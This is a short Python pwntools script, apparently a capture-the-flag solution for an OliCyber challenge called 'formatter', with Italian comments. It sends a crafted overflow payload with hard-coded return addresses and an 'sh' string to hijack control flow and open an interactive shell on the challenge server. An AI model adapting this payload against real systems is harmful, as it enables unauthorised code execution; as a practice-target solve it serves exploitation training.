#!/usr/bin/env python3
from pwn import *

elf = ELF('./formatter')
if args.REMOTE:
    r = remote('formatter.challs.olicyber.it', 20006)
else:
    r = gdb.debug('./formatter', '''
        b *main
        b *0x4014F9
        c
    ''')
    
DATA = p64(0x4050A0) # lol
PAYLOAD = b'sh\0a' + b'\\h' * 19 + p64(0x4015e3) + DATA + p64(0x401535)
# 8 + 4 * 18 = 80 = offset of ret
# 8 + 18 * 2 = 44 - 64 = 20 / 8 = 2 64bits

if args.REMOTE:
    r.recvuntil(b'stringhe.\n')
else:
    r.recvuntil(b'formattata!\n')

r.sendline(PAYLOAD)
r.interactive()
# questa soluzione è unintended ma funzia lol
# teoricamente dovrei mettere nell'rbp un ret address per la rop e fare stack pivoting ma non ho voglia